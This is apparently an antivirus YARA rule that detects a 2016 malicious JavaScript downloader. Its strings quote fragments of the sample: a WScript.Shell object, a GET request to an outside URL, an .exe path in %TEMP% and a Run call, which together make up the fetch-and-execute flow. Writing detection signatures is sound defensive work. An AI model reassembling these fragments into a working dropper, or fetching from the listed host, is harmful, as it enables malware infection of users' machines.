rule sig_20160328_b67f49eff01160b6de103cadf6b80621 {
  meta:
    description = "datamaliciousorder - file 20160328_b67f49eff01160b6de103cadf6b80621.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6da05805077ad6f8ee9391ee1e9943d76acc96b3cefff93d334e31d93b907c3d"

  strings:
    $x1  = "function Opgrvt() {return Aairc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"sX6IWONKKFwkoQ.exe\";};" fullword ascii
    $s2  = "var Aairc = function Nzvlemz() {return WScript[Ybxjrcpy](\"WScript.Shell\");}();" fullword ascii
    $s3  = "do {WScript[Iuonw](Husxsrsx() * 11)} while (Bmjfzk[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Kwtytzvz(Zlyhs){Aairc[\"Run\"](Zlyhs, Lhvktymtl, Lhvktymtl);};" fullword ascii
    $s5  = "function Pwjrfew(Dyqzybdba, Gnklhcqf){return Dyqzybdba - Gnklhcqf;};" fullword ascii
    $s6  = "Bmjfzk[Espof](\"GET\", \"http://www.europaklasse-lbk.de/p4iska\", false);" fullword ascii
    $s7  = "function Cucgwwc() {return ((Dlnavqktxv == true) && (Dlnavqktxv == Xpbrnbmjx)) ? 1 : Lhvktymtl;};" fullword ascii
    $s8  = "function Ftyiqtlsx()" fullword ascii
    $s9  = "function Sgogjorwey(){return Syhaopuree;};" fullword ascii
    $s10 = "var Kphgltnwh = false;" fullword ascii
    $s11 = " while (Yflxifapd){" fullword ascii
    $s12 = "function Husxsrsx(){return 22;};" fullword ascii
    $s13 = "return Pwjrfew(Qqwystx, Ntohgd);" fullword ascii
    $s14 = "function Haogebfw(Espxyit) {var Sghmoihvhm = (1, 2, 3, 4, 5, Espxyit); return Sghmoihvhm;};" fullword ascii
    $s15 = "var Xpbrnbmjx = false;" fullword ascii
    $s16 = "Dlnavqktxv = true; " fullword ascii
    $s17 = "Xpbrnbmjx = true; " fullword ascii
    $s18 = "function Rszfwm(){return Ybxjrcpy;};" fullword ascii
    $s19 = "var Qfdvyn = new this[\"Date\"]();" fullword ascii
    $s20 = "var Dlnavqktxv = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    1 of ($x*) and 4 of them
}